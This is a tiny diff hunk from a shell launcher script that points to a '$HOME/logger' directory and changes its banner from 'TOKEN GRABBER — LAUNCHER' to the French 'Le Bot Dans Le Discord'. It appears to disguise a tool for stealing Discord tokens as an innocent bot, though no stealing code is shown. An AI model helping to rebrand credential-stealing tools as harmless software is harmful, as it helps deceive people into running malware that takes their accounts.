@@ -5,7 +5,7 @@
 LOGGER_DIR="$HOME/logger"
 
 clear
-echo -e "\033[1;36m=== TOKEN GRABBER — LAUNCHER ===\033[0m"
+echo -e "\033[1;36mLe Bot Dans Le Discord\033[0m"
 echo ""
 
 # vérifie que le logger existe
